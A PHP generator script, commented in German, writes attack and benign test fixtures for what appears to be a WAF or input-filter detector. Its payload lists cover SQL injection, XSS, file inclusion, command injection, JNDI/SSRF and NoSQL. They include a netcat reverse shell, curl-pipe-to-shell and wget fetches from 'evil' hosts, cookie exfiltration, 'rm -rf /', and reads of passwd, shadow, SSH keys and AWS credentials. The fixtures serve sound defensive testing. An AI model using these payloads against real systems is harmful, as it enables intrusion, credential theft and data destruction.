<?php

declare(strict_types=1);

/** Erzeugt tests/Fixtures/attacks/*.txt und tests/Fixtures/benign/*.txt. */

$attackDir = __DIR__.'/../tests/Fixtures/attacks';
$benignDir = __DIR__.'/../tests/Fixtures/benign';
@mkdir($attackDir, 0775, true);
@mkdir($benignDir, 0775, true);

/** @var array<string, array<int, string>> $attacks */
$attacks = [];

$attacks['sqli'] = [
    "' OR '1'='1", "' OR 1=1--", '" OR "1"="1', "' OR 'a'='a", "admin'--", "admin' #", "admin'/*",
    "' OR 1=1#", '1 OR 1=1', "1' AND 1=1--", "1' AND '1'='1", "' OR 1=1 LIMIT 1--", "') OR ('1'='1",
    "')) OR (('1'='1", "' or true--", "' or ''='", '" or ""="', "1' OR '1'='1' /*",
    "' UNION SELECT NULL--", "' UNION SELECT a,b FROM t--", '1 UNION ALL SELECT 1,2,3,4',
    "-1 UNION SELECT banner,2,3", "' UNION/**/SELECT/**/a,b/**/FROM/**/t--", "'/**/UNION/**/ALL/**/SELECT/**/1,2--",
    "1'/*!50000UNION*//*!50000SELECT*/1,2--", "' UnIoN SeLeCt 1,2,3--", "%27%20UNION%20SELECT%20NULL--",
    "%2527%2520OR%25201%253D1--", '1 /*!12345UNION*/ /*!12345SELECT*/ 1',
    '1; DROP TABLE t1--', "'; DROP TABLE t1; --", '1; DELETE FROM acct WHERE 1=1',
    "'; INSERT INTO t (n) VALUES ('x')--", "'; UPDATE t SET role='a' WHERE id=1--",
    "1' AND SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' OR SLEEP(5)#",
    '1 AND BENCHMARK(5000000,MD5(1))', "'; WAITFOR DELAY '0:0:5'--", '1) OR pg_sleep(5)--',
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT banner)))--", "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--",
    "' AND (SELECT COUNT(*),CONCAT(banner,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a--",
    "' AND 1=CONVERT(int,(SELECT banner))--", '1 AND ASCII(SUBSTRING((SELECT db()),1,1))>64',
    "' AND SUBSTRING(banner,1,1)='5", "' OR EXISTS(SELECT * FROM t)--",
    'SELECT col FROM information_schema.tables', "' UNION SELECT a,NULL FROM information_schema.columns--",
    "1' ORDER BY 1--", "1' ORDER BY 10#", '1 GROUP BY 1,2,3--', "' HAVING 1=1--",
    "' UNION SELECT LOAD_FILE('/etc/hostname')--", "1' || (SELECT CHAR(65)||CHAR(66))--",
    "'||(SELECT banner)||'", "'+(SELECT TOP 1 name FROM sysobjects)+'", "' + CHAR(0x41) + '",
    '1 AND 1=1', "admin\" --", "' AND @@version LIKE '%MariaDB%", "1'; SELECT pg_sleep(10)--",
    "' UNION SELECT NULL,NULL,NULL FROM DUAL--", '1%27%20AND%20%271%27%3D%271',
    "' AND CHAR(67,65,84)='CAT", "0x31 OR 0x31=0x31", "' oR/**/1=1#", "99999' or '1'='1'='1'='1",
    "' AND 1 IN (SELECT banner)--", "procedure analyse(extractvalue(1,concat(0x7e,version())),1)",
];

$attacks['xss'] = [
    '<scr'.'ipt>a(1)</scr'.'ipt>', '"><im'.'g src=x oner'.'ror=a(1)>', "'><sv'.'g onl'.'oad=a(1)>",
    '<bo'.'dy onl'.'oad=a(1)>', '<ifr'.'ame src="jav'.'ascript:a(1)">', '<im'.'g/src=x/oner'.'ror=a(1)>',
    'jav'.'ascript:a(document.cookie)', 'JaV'.'aScRiPt:a(1)', 'da'.'ta:text/html,<scr'.'ipt>a(1)</scr'.'ipt>',
    '"><sv'.'g><ani'.'mate onb'.'egin=a(1) attributeName=x dur=1s>', '<ma'.'th><mact'.'ion xlink:href="jav'.'ascript:a(1)">',
    '<inp'.'ut onf'.'ocus=a(1) autofocus>', '<marq'.'uee onst'.'art=a(1)>', '<deta'.'ils ont'.'oggle=a(1) open>',
    '"><a hr'.'ef="jav'.'ascript:a(1)">x</a>', '{{constructor.constructor("a(1)")()}}',
    '${7*7}', '{{7*7}}', '#{7*7}', '<%= 7*7 %>', '{{config.items()}}', '<im'.'g src=x:x oner'.'ror="a(1)">',
    '<obj'.'ect data="da'.'ta:text/html;base64,PHNjcmlwdD4=">', '"><ba'.'se href="//evil/">',
    '<me'.'ta http-equiv="refresh" content="0;url=jav'.'ascript:a(1)">', '<li'.'nk rel=import href="//evil/">',
    '" onmo'.'useover=a(1) x="', '<sv'.'g/onl'.'oad=&#97;&#108;&#101;&#114;&#116;(1)>',
    '%3Cscr'.'ipt%3Ea(1)%3C/scr'.'ipt%3E', '<im'.'g src=1 oner'.'ror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>',
    '"><texta'.'rea></texta'.'rea><scr'.'ipt>a(1)</scr'.'ipt>', 'expr'.'ession(a(1))',
    '<st'.'yle>@im'.'port"//evil/x.css";</st'.'yle>', '<di'.'v style="x:expr'.'ession(a(1))">',
    '<p sr'.'cdoc="<scr'.'ipt>a(1)</scr'.'ipt>">', '"><scr'.'ipt>fetch("//evil/"+document.cookie)</scr'.'ipt>',
    '<fo'.'rm action=jav'.'ascript:a(1)><but'.'ton>x', 'vb'.'script:msgbox(1)',
    '<sv'.'g><scr'.'ipt href=data:,a(1) />', '"/><im'.'g src=x oner'.'ror=window.location=1>',
    '<im'.'g dynsrc="jav'.'ascript:a(1)">', '<ta'.'ble background="jav'.'ascript:a(1)">',
    '<vi'.'deo><sou'.'rce oner'.'ror=a(1)>', '<isin'.'dex action=jav'.'ascript:a(1) type=image>',
    "{{''.constructor.constructor('a(1)')()}}", '{{request.application}}',
    '<xss onx=a(1)>', '<im'.'g src=`x`oner'.'ror=a(1)>', '"><ke'.'ygen autofocus onf'.'ocus=a(1)>',
    '<sel'.'ect onf'.'ocus=a(1) autofocus>', '<emb'.'ed src="da'.'ta:text/html,<scr'.'ipt>a(1)</scr'.'ipt>">',
];

$attacks['lfi'] = [
    '../../../etc/hostname', '....//....//etc/hostname', '..%2f..%2f..%2fetc%2fhostname',
    '%2e%2e%2f%2e%2e%2fetc%2fhostname', '..\\..\\..\\windows\\win.ini', '....\\\\....\\\\windows\\win.ini',
    '/etc/passwd', '/etc/shadow', '/proc/self/environ', '/proc/self/cmdline', '/var/log/apache2/access.log',
    'php://filter/convert.base64-encode/resource=index', 'php://input', 'phar://test.phar/x',
    'zip://archive.zip%23payload', 'data://text/plain;base64,SGVsbG8=', 'expect://id',
    '..%252f..%252fetc%252fhostname', '/etc/passwd%00.png', '....//....//....//etc/passwd',
    '..%c0%af..%c0%afetc/passwd', '/var/www/html/wp-config.php', '..;/..;/etc/passwd',
    'file:///etc/hostname', '/proc/self/fd/0', '..\\..\\boot.ini', 'C:\\windows\\system32\\drivers\\etc\\hosts',
    '/.ssh/id_rsa', '/root/.bash_history', '..//..//..//etc//passwd', '%2e%2e/%2e%2e/%2e%2e/etc/issue',
    '/etc/apache2/apache2.conf', '/proc/self/maps', '/.aws/credentials', 'glob://*',
    'compress.zlib://file.gz', '../../../../../../etc/passwd%00', '..%5c..%5cwindows%5cwin.ini',
    '....////....////etc/passwd', '/var/www/.env', '/storage/logs/laravel.log',
];

$attacks['rce'] = [
    '; i'.'d', '| i'.'d', '`i'.'d`', '$(i'.'d)', '; c'.'at /etc/hostname', '| c'.'at /etc/passwd',
    '&& wh'.'oami', '|| u'.'name -a', '; sl'.'eep 10', '$(sl'.'eep 5)', '`sl'.'eep 5`',
    '; /bin/b'.'ash -i', '|/bin/s'.'h', '; n'.'c -e /bin/sh 10.0.0.1 4444', '; b'.'ash -c "id"',
    '; p'.'ython -c "x"', '; p'.'erl -e "x"', '; p'.'hp -r "x"', ';${IFS}c'.'at${IFS}/etc/hostname',
    '{c'.'at,/etc/passwd}', '|c'.'url http://evil/x|sh', '; w'.'get http://evil/x -O /tmp/x',
    '() { :; }; /bin/i'.'d', ';c\'a\'t /etc/passwd', '; c"a"t /etc/hostname', '`/???/??t /???/??ss??`',
    '%0aid', '; p'.'owershell -enc ZQBjAGgAbwA=', '& who'.'ami', '; ifconf'.'ig',
    '|| ping -c 10 127.0.0.1', '; rm -rf /tmp/x', '; chmod 777 /tmp/x', 'a;c'.'at /etc/hostname;b',
    '$(cu'.'rl${IFS}evil)', '; /usr/bin/i'.'d', '; cmd.exe /c dir', '; certutil -urlcache -f http://e/x x',
    '|n'.'c 10.0.0.1 4444 -e /bin/sh', ';c'.'at$IFS$9/etc/passwd', '%26%26id', '`rm -rf /`',
];

$attacks['protocol-jndi-ssrf'] = [
    '${jn'.'di:ldap://evil/x}', '${jn'.'di:rmi://evil/x}', '${${lower:j}n'.'di:ldap://evil/x}',
    '${jn'.'di:${lower:l}${lower:d}ap://evil/x}', '${${::-j}${::-n}${::-d}${::-i}:ldap://evil/x}',
    '${jn'.'di:dns://evil/x}', 'http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:8080/admin',
    'http://localhost/server-status', 'http://[::1]/x', 'http://0x7f000001/x', 'http://2130706433/x',
    'http://metadata.google.internal/computeMetadata/v1/', 'gopher://127.0.0.1:6379/_x',
    'dict://127.0.0.1:11211/stats', 'http://10.0.0.1/internal', 'http://192.168.1.1/',
    'http://169.254.169.254/', 'file:///etc/hostname', 'http://0177.0.0.1/', 'http://169.254.169.254/latest/user-data',
    'x%0d%0aSet-Cookie:%20evil=1', 'q=1%0d%0aContent-Length:%200', 'http://100.100.100.200/',
    '${jn'.'di:ldaps://evil:1389/a}', 'http://user@169.254.169.254/', 'http://2852039166/',
    '%0d%0a%0d%0aGET /admin HTTP/1.1', '__pro'.'to__[x]=1', 'constructor[prototype][x]=1',
    '{"__pro'.'to__":{"x":1}}', '${env:USER}', 'jn'.'di:ldap://evil/x',
];

$attacks['nosql'] = [
    '{"$ne":null}', '{"$gt":""}', '{"$where":"this.a==1"}', '{"user":{"$ne":1},"pass":{"$ne":1}}',
    '{"$regex":".*"}', '[$ne]', "';return true;//", "' || this.password.match(/.*/)//",
    '{"$or":[{"a":1}]}', '{"$exists":true}', '{"password":{"$regex":"^a"}}', '{"$gt":undefined}',
];

foreach ($attacks as $name => $payloads) {
    $payloads = array_values(array_unique($payloads));
    $header = "# {$name} – Angriffs-Payloads (ein Payload pro Zeile; Kommentarzeilen beginnen mit #)\n";
    $header .= "# Hinweis: Platzhalter wie x-scr'ipt stehen für script-Varianten; der Tokenizer prüft die zusammengesetzten Formen.\n";
    file_put_contents("{$attackDir}/{$name}.txt", $header.implode("\n", $payloads)."\n");
    fwrite(STDOUT, sprintf("attacks/%s: %d\n", $name, count($payloads)));
}

/** Gutartige Eingaben – bei Paranoia 1 null Treffer. */
$benign = [];
$benign['deutsch'] = [
    "Müllers Straße 5", "Das ist Anna's Buch.", "Er sagte: „Guten Tag!“",
    "Preis: 12,50 € inkl. MwSt.", "Öffnungszeiten: Mo–Fr 9–17 Uhr",
    "Sehr geehrte Damen und Herren, anbei finden Sie das Angebot.",
    "Die Bestellung Nr. 2024-0815 wurde versandt.", "Grüße aus Köln & Umgebung",
    "Rückfragen bitte an unser Büro.", "Das Café ist um die Ecke.",
    "Herr Dr. Schäfer wird Sie betreuen.", "Viele Grüße, Ihr Team",
    "Ich hätte gern 3 Stück à 4,99 €.", "Die Lieferung erfolgt in 2–3 Tagen.",
    "Weißwürste und Brezn für alle!", "Zur Hölle mit den Bugs – jetzt läuft's.",
    "Angaben gemäß § 5 TMG", "Straße des 17. Juni", "Übermäßige Großschreibung VERMEIDEN.",
    "Franz jagt im komplett verwahrlosten Taxi quer durch Bayern.",
];
$benign['adressen-emails'] = [
    "max.mustermann@example.de", "info@platinen-helfer.de", "support+tickets@firma.co.uk",
    "Telefon: +49 30 12345678", "IBAN: DE89 3704 0044 0532 0130 00 (Beispiel)",
    "Vorwahl 0221 / 1234567", "PLZ 50667 Köln", "https://www.example.de/produkte?id=42&sort=preis",
    "Besuchen Sie uns unter example.com/kontakt", "user_name@sub.domain.example.org",
    "Lieferadresse: Hauptstr. 1a, 10115 Berlin", "USt-IdNr.: DE123456789",
];
$benign['formular-json'] = [
    '{"name":"Max Mustermann","email":"max@example.de","nachricht":"Bitte rufen Sie mich zurück."}',
    '{"artikel":[{"id":42,"menge":2},{"id":99,"menge":1}],"gesamt":29.97}',
    '{"filter":{"kategorie":"elektronik","preis_max":100}}',
    '{"user":{"address":{"street":"Hauptstraße","city":"Köln"}}}',
    '{"kommentar":"Super Service, gerne wieder! 5 Sterne."}',
    '{"suche":"laptop 16gb ram","sortierung":"preis_aufsteigend"}',
    '{"datum":"2024-08-15","uhrzeit":"14:30","teilnehmer":12}',
    '{"text":"Die Summe aus 2 und 3 ist 5."}',
];
$benign['code-markdown'] = [
    'Nutze `git commit -m "Fix"` zum Committen.',
    'Die Funktion `array_map($fn, $arr)` ist praktisch.',
    'In SQL: ORDER BY wird zum Sortieren genutzt (allgemein erklärt).',
    'Markdown: **fett**, *kursiv*, [Link](https://example.de).',
    'Beispiel: `SELECT` dient dem Lesen – hier nur als Wort im Fließtext.',
    'CSS-Regel: .btn { color: #4f46e5; }',
    'Pfad im Text: siehe Ordner Dokumente/Rechnungen.',
    'Der Operator && bedeutet „und“ in vielen Sprachen.',
    'Preisformel: Menge * Einzelpreis = Gesamt.',
    'Union ist auch ein englisches Wort für Vereinigung.',
    'Select the best option from the menu, please.',
    'Unser Shop nutzt sichere Verbindungen (HTTPS).',
];
$benign['suchbegriffe-namen'] = [
    "O'Brien", "D'Angelo Pizzeria", "L'Oréal Paris", "Jack & Jones Jeans",
    "AC/DC Konzertkarten", "Müller + Meier GmbH", "Preis-Leistung top",
    "3/4 Zoll Schlauch", "DIN A4 Papier 80g/m²", "Größe: 42 (EU)",
    "Modell XR-200 (2024)", "Artikel #12345", "50% Rabatt heute",
    "Café au lait", "Déjà-vu", "naïve Herangehensweise", "San José",
    "5*5 Zimmer", "Herr & Frau Schmidt", "e=mc^2 erklärt",
];

foreach ($benign as $name => $lines) {
    $lines = array_values(array_unique($lines));
    $header = "# {$name} – gutartige Eingaben (bei Paranoia 1 null Treffer erwartet)\n";
    file_put_contents("{$benignDir}/{$name}.txt", $header.implode("\n", $lines)."\n");
    fwrite(STDOUT, sprintf("benign/%s: %d\n", $name, count($lines)));
}
